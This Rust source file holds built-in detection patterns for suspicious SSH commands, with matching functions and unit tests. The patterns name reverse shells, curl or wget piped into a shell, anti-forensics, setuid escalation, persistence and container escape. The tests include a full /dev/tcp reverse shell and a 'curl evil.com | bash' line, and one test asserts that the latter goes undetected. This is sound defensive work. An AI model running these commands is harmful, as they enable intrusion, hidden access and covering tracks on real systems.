/// Return builtin suspicious command patterns for SSH session analysis.
/// These patterns catch common post-exploitation and anti-forensics activity.
pub fn builtin_patterns() -> Vec<&'static str> {
    vec![
        // Remote code execution
        "curl|sh",
        "curl|bash",
        "wget|sh",
        "wget|bash",
        "curl -s|sh",
        "curl -s|bash",
        "wget -q|sh",
        "wget -q|bash",
        // Payload decoding
        "base64 -d",
        "base64 --decode",
        // Reverse shells
        "python -c 'import socket",
        "python3 -c 'import socket",
        "perl -e 'use Socket",
        "ruby -rsocket",
        "bash -i >& /dev/tcp/",
        "nc -e /bin/",
        "ncat -e /bin/",
        "socat exec:",
        "mkfifo /tmp/",
        // Privilege escalation
        "chmod +s ",
        "chmod u+s ",
        "chmod 4755",
        "chmod 4777",
        // Anti-forensics
        "history -c",
        "history -w /dev/null",
        "unset HISTFILE",
        "export HISTSIZE=0",
        "shred ",
        "> ~/.bash_history",
        // Data exfiltration
        "xxd -p|",
        "openssl enc -base64",
        // Persistence
        "crontab -",
        "at -f ",
        // Container escape
        "nsenter --target 1",
        "chroot /host",
    ]
}

/// Check if a command matches any builtin suspicious pattern.
pub fn matches_builtin_pattern(cmd: &str) -> Option<&'static str> {
    builtin_patterns()
        .into_iter()
        .find(|pattern| cmd.contains(pattern))
}

/// Check if a command matches any user-configured suspicious pattern.
/// Returns the matched pattern string.
pub fn matches_user_pattern<'a>(cmd: &str, extra_patterns: &'a [String]) -> Option<&'a str> {
    for pattern in extra_patterns {
        if cmd.contains(pattern.as_str()) {
            return Some(pattern.as_str());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_patterns_not_empty() {
        assert!(!builtin_patterns().is_empty());
    }

    #[test]
    fn test_pattern_matching() {
        assert!(matches_builtin_pattern("curl -s http://evil.com | bash").is_none());
        assert!(matches_builtin_pattern("curl -s|bash").is_some());
        assert!(matches_builtin_pattern("base64 -d payload.b64").is_some());
        assert!(matches_builtin_pattern("chmod +s /tmp/backdoor").is_some());
        assert!(matches_builtin_pattern("history -c").is_some());
        assert!(matches_builtin_pattern("ls -la /tmp").is_none());
    }

    #[test]
    fn test_reverse_shell_patterns() {
        assert!(matches_builtin_pattern("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").is_some());
        assert!(matches_builtin_pattern("python -c 'import socket,subprocess,os").is_some());
    }

    #[test]
    fn test_user_patterns() {
        let extra = vec!["custom_evil".to_string(), "bad_tool".to_string()];
        assert!(matches_user_pattern("running custom_evil here", &extra).is_some());
        assert!(matches_user_pattern("normal command", &extra).is_none());
    }
}
